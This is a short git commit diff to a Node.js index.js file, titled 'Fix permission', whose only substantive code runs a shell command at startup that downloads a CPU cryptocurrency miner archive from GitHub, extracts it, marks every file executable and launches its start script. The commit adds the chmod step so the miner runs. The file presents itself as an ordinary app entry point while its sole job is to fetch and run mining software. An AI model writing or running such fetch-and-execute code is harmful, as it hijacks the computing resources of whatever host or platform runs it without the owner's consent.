88221f224878d410cf88f11f9e8aa41284fbfaaf
RIFAIGGZ <76506048+itsmeR1F4I@users.noreply.github.com>
2022-06-22 18:00:22 +0700

    Fix permission

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 const { exec, spawn, execSync } = require("child_process")
 console.log('STARTING...');
-rifai = exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && bash start.sh')
+rifai = exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x * && bash start.sh')
 return rifai;
 let { stdout, stderr } = rifai
     if (stdout.trim()) console.log(stdout)
